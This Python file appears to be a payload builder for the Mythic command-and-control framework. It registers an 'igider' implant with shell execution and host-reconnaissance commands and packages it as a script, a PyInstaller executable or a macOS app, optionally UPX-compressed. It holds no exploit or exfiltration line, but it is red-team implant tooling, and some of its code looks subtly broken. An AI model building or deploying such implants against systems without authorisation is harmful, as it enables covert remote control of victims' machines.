from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
import asyncio
import os
import tempfile
import shutil
import subprocess

# Command Imports
from commands.shell import ShellCommand
from .igider.agent_functions.files import CatFileCommand, ListFilesCommand, ChangeDirCommand, GetPwdCommand
from .igider.agent_functions.system import ListEnvCommand, GetUserCommand, GetHostnameCommand
from .igider.agent_functions.processes import ListProcessesCommand
from .igider.agent_functions.network import ListConnectionsCommand

# Payload Type Registration 
class PayloadType(PayloadType):
    name = "igider"
    file_extension = "py"
    author = "@you"
    supported_os = ["windows", "linux", "macos"]
    wrapper = False
    wrapped_payloads = []
    note = "igider Python agent"
    supports_dynamic_loading = False
    build_parameters = []
    agent_type = "implant"

    supported_commands = [
        ShellCommand,
        CatFileCommand,
        ListFilesCommand,
        ChangeDirCommand,
        GetPwdCommand,
        ListEnvCommand,
        GetUserCommand,
        GetHostnameCommand,
        ListProcessesCommand,
        ListConnectionsCommand
    ]

# === Payload Builder ===
class igider(PayloadBuilder):
    name = "igider"
    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose the output type",
            choices=["py", "exe", "app"],
            default_value="py",
        ),
        BuildParameter(
            name="include_dependencies",
            parameter_type=BuildParameterType.Boolean,
            description="Include required Python dependencies",
            default_value=True,
        ),
        BuildParameter(
            name="use_upx",
            parameter_type=BuildParameterType.Boolean,
            description="Enable UPX compression (requires UPX installed)",
            default_value=False,
        ),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        try:
            agent_code = self.get_parameter("payload")
            output_type = self.get_parameter("output_type")
            include_dependencies = self.get_parameter("include_dependencies")
            use_upx = self.get_parameter("use_upx")

            if output_type == "py":
                resp.payload = agent_code.encode()
                resp.build_message = "Successfully built Python agent script"
                return resp

            elif output_type == "exe":
                with tempfile.TemporaryDirectory() as tmpdirname:
                    agent_file = os.path.join(tmpdirname, "agent.py")
                    with open(agent_file, "w") as f:
                        f.write(agent_code)

                    if include_dependencies:
                        req_file = os.path.join(tmpdirname, "requirements.txt")
                        with open(req_file, "w") as f:
                            f.write("cryptography\nrequests\npyOpenSSL\n")
                        subprocess.run(
                            ["pip3", "install", "-r", req_file],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            check=True
                        )

                    build_cmd = [
                        "pyinstaller",
                        "--onefile",
                        "--distpath", os.path.join(tmpdirname, "dist"),
                        "--workpath", os.path.join(tmpdirname, "build"),
                        "--specpath", os.path.join(tmpdirname, "spec"),
                        agent_file
                    ]

                    if use_upx:
                        build_cmd.append("--upx-dir=/usr/local/bin")

                    result = subprocess.run(build_cmd, capture_output=True, text=True)

                    exe_path = os.path.join(tmpdirname, "dist", "agent.exe")
                    if os.path.exists(exe_path):
                        with open(exe_path, "rb") as f:
                            resp.payload = f.read()
                        resp.build_message = "Successfully built EXE using PyInstaller"
                    else:
                        resp.status = BuildStatus.Error
                        resp.build_message = f"PyInstaller failed:\n{result.stderr}"

            elif output_type == "app":
                with tempfile.TemporaryDirectory() as tmpdirname:
                    agent_file = os.path.join(tmpdirname, "agent.py")
                    with open(agent_file, "w") as f:
                        f.write(agent_code)

                    if include_dependencies:
                        req_file = os.path.join(tmpdirname, "requirements.txt")
                        with open(req_file, "w") as f:
                            f.write("cryptography\nrequests\npyOpenSSL\n")
                        subprocess.run(
                            ["pip3", "install", "-r", req_file],
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL,
                            check=True
                        )

                    build_cmd = [
                        "pyinstaller",
                        "--windowed",
                        "--name", "igider",
                        "--distpath", os.path.join(tmpdirname, "dist"),
                        "--workpath", os.path.join(tmpdirname, "build"),
                        "--specpath", os.path.join(tmpdirname, "spec"),
                        agent_file
                    ]

                    result = subprocess.run(build_cmd, capture_output=True, text=True)

                    app_path = os.path.join(tmpdirname, "dist", "igider.app")
                    if os.path.exists(app_path):
                        zip_path = os.path.join(tmpdirname, "igider.app.zip")
                        shutil.make_archive(zip_path.replace(".zip", ""), 'zip', app_path)

                        with open(zip_path, "rb") as f:
                            resp.payload = f.read()

                        resp.build_message = "Successfully built macOS .app bundle (zipped)"
                    else:
                        resp.status = BuildStatus.Error
                        resp.build_message = f"PyInstaller failed to create .app:\n{result.stderr}"

            else:
                resp.status = BuildStatus.Error
                resp.build_message = f"Unsupported output type: {output_type}"

        except Exception as e:
            resp.status = BuildStatus.Error
            resp.build_message = f"Error during build process: {str(e)}"

        return resp